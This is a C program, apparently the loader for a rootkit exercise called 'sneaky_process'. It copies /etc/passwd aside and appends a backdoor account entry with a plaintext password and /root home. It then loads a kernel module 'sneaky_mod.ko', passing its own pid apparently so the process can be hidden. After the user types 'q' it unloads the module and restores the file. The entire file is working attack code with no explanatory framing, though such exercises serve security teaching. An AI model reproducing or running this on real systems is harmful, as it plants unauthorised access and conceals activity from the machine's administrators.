#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define PASSWD_PATH "/etc/passwd"
#define TMP_PASSWD_PATH "/tmp/passwd"

void print_pid() {
    printf("sneaky_process pid = %d\n", getpid());
}

void copy_file(){
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "cp %s %s", PASSWD_PATH, TMP_PASSWD_PATH);
    system(cmd);
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> " PASSWD_PATH);
}

void load_sneaky_module(){
    char cmd[100];
    int pid = getpid();
    snprintf(cmd, sizeof(cmd), "insmod sneaky_mod.ko sneaky_pid=%d", pid);
    if (system(cmd) != 0) {
        fprintf(stderr, "Failed to load module\n");
        exit(1);
    }
}

void read_input(){
    int c;
    while((c = getchar()) != EOF){
        if(c == 'q'){
            break;
        }
    }
}

void unload_sneaky_module() {
    if (system("rmmod sneaky_mod") != 0) {
        fprintf(stderr, "Failed to unload module\n");
    }
}

void restore_file() {
    char cmd[100];
    snprintf(cmd, sizeof(cmd), "cp %s %s", TMP_PASSWD_PATH, PASSWD_PATH);
    system(cmd);
    snprintf(cmd, sizeof(cmd), "rm %s", TMP_PASSWD_PATH);
    system(cmd);
}

int main(){
    print_pid();
    copy_file();
    load_sneaky_module();
    read_input();
    unload_sneaky_module();
    restore_file();
    return 0;
}
